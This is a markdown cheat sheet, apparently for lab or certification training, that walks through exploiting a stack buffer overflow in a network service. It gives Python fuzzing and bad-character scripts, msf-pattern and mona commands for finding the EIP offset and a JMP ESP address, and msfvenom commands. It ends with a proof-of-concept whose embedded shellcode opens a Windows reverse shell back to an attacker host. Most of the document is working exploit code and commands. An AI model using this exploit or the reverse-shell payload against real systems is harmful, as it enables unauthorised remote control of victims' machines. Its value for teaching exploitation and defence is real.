# Buffer Overflow

## Fuzz
Interact with target service, increasing buffer size, and see if/when it crashes
```python
import socket

for r in range(1,10):
    size = 25 * r
    buffer = "A" * size + "\n"
    print "Sending a buffer of size " + str(size)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.5.21",31337))
    s.send(buffer)
    print "Returned: " + s.recv(1400)
    s.close()
```
------------------------------------------------------------------------------------------------

## Determine offsets and shellcode space:
* Determine EIP offset
  * `msf-pattern_create -l 200 > bof_pattern`
  * `cat bof_pattern | nc 10.0.5.21 31337` or modify fuzzing program to send patterned buffer
  * In debugger: find the part of the string that overwrote EIP `msf-pattern_offset -l 200 -q 39654138`
  * Prove this offset is correct (EIP should be `0x42424242`) `python -c 'print "A"*146 + "B"*4 + "C"*50' | nc 10.0.5.21 31337`
  * Determine space for shellcode: Increase the `C` string length and determine where it gets cut off `python -c 'print "A"*146 + "B"*4 + "C"*600+"DDDD"' | nc 10.0.5.21 31337`

------------------------------------------------------------------------------------------------

## Determine bad characters
Iteratively send all bytes to the target program in a buffer, adding bad chars to the `badchars` string as they are found to be problematic (e.g. not appearing in target buffer/truncating buffer)
```python
buffer = 200 * "A"
badchars = "\x00\n\r "
for c in range(0,256):
    if not chr(c) in badchars:        
        buffer += chr(c)
    else:
        print "[*] excluded char: " + str(c)

buffer += "C"*150
buffer += "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.5.21",31337))
s.send(buffer)
s.close()
```
------------------------------------------------------------------------------------------------

## Locate a `JMP ESP` or `CALL ESP`
* Search for the bytes:
  * `$ msf-nasm_shell`
  * `nasm > jmp esp`
  * `00000000  FFE4              jmp esp`
  * `nasm > call esp`
  * `00000000  FFD4              call esp`
* OR search with mona.py in Immunity Debugger
  * `!mona jmp -r ESP`
  * `!mona find -s \xff\xd4` (output to text file in Immunity program dir)
* Prove it correct (`0xCC` bytes trigger an INT that will pause debugger)
  * `EIP = "\xc3\x14\x04\x08"`
  * `buffer = "A"*146 + EIP + "\xCC"*600 + "DDDD" + "\n"`

Generate shellcode
* `msfvenom --list payloads`
* `msfvenom -p windows/exec --list-options`
* `msfvenom -p windows/exec CMD=C:\\windows\\system32\\calc.exe -f python -b '\x00\x08\x0a\x0d\x20'`
* `msfvenom -p windows/shell_reverse_tcp LPORT=6000 LHOST=10.0.5.20 EXITFUNC=thread -f python -b '\x00\x08\x0a\x0d\x20'`

------------------------------------------------------------------------------------------------
## Final PoC code
```python
import socket

# msfvenom -p windows/shell_reverse_tcp LPORT=6000 LHOST=10.0.5.20 EXITFUNC=thread -f python -b '\x00\x08\x0a\x0d\x20'
buf =  ""
buf += "\xd9\xc8\xd9\x74\x24\xf4\x58\xba\xd0\x4d\x62\xe7\x33"
buf += "\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\x80\x5e\x80"
# ...snip...
buf += "\xd6\x19\x0a\xca\xbb\x99\xe1\x09\xc2\x19\x03\xf2\x31"
buf += "\x01\x66\xf7\x7e\x85\x9b\x85\xef\x60\x9b\x3a\x0f\xa1"
shellcode = buf

EIP = "\xc3\x14\x04\x08" # !mona jmp -r ESP found: 0x080414c3 and 0x080416bf
NOP1 = "\x90"*12
NOP2 = "\x90" * (604-len(shellcode)-len(NOP1))
buffer = "A"*146 + EIP + NOP1 + shellcode + NOP2 + "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.5.21",31337))
s.send(buffer)
s.close()

```